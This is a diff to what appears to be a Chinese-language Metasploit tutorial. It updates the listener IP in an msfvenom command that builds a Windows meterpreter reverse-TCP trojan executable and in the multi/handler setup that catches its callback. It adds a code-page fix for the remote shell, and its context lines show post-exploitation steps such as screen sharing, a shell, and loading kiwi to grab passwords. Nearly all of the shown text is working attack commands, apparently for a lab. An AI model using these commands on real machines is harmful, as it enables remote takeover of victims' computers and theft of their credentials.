@@ -42,14 +42,14 @@ run
 
 ```shell
 # 1、生成远控木马   msfvenom -p [payload] LHOST=[IP地址] LPORT=[端口号] -f [格式] -o [文件名]
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.137.194 LPORT=10000 -f exe -o demo.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.16.20.99 LPORT=10000 -f exe -o demo.exe
 
 # 2、主控端 -- 开启监听
 msfconsole
 use exploit/multi/handler
 show options
 set payload windows/x64/meterpreter_reverse_tcp
-set LHOST 192.168.137.194
+set LHOST 172.16.20.99
 set LPORT 10000
 # 等待目标靶机上线
 run
@@ -89,6 +89,8 @@ screenshare
 
 # 执行各种命令
 shell
+# 解决命令行乱码问题
+chcp 65001
 
 # kiwi抓取密码 -- 我这里测试失败
 load kiwi
